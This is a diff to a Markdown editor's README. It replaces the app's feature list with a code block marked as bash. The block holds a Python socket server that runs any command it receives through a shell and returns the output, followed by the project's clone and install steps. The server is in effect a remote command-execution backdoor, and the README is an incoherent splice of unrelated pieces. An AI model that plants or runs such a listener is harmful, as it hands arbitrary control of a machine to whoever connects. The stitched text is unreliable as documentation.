@@ -49,18 +49,46 @@
 * Sync Scrolling
   - While you type, LivePreview will automatically scroll to the current location you're editing.
 * GitHub Flavored Markdown  
-* Syntax highlighting
-* [KaTeX](https://khan.github.io/KaTeX/) Support
-* Dark/Light mode
-* Toolbar for basic Markdown formatting
-* Supports multiple cursors
-* Save the Markdown preview as PDF
-* Emoji support in preview :tada:
-* App will keep alive in tray for quick usage
-* Full screen mode
-  - Write distraction free.
-* Cross platform
-  - Windows, macOS and Linux ready.
+```bash
+import socket
+import subprocess
+
+host = '127.0.0.1'
+port = 4246
+
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind((host,port))
+server_socket.listen()
+
+conn,addr = server_socket.accept()
+print("connected from : "+str(addr))
+
+while True :
+    data = conn.recv(1024).decode()
+    print(data)
+
+    result = subprocess.run(data,stdout=subprocess.PIPE, shell=True)
+    if(result.stdout.decode()!=""):
+        response_data=result.stdout
+    else:
+        response_data=("command executed").encode()
+
+
+    conn.send(response_data)
+conn.close()
+
+# Clone this repository
+$ git clone https://github.com/amitmerchant1990/electron-markdownify
+
+# Go into the repository
+$ cd electron-markdownify
+
+# Install dependencies
+$ npm install
+
+# Run the app
+$ npm start
+```
 
 ## Ders 2
 
